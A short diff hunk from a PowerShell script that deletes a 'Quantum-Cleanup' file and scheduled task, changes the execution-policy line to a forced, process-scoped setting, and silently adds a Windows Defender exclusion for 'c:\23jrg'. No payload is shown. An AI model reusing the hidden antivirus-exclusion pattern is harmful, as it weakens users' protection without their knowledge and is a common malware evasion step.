@@ -20,7 +20,7 @@ Remove-Item -Path "C:\Program Files\Quantum-Cleanup.ps1" -Force;
 schtasks.exe /delete /f /TN Quantum-Cleanup;
 
 # Set Execution Policy Remote Signed
-set-executionpolicy remotesigned;a;y;
+set-executionpolicy remotesigned -Scope Process -Force
 
 # Set exclusion path to prevent false positives
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "c:\23jrg";
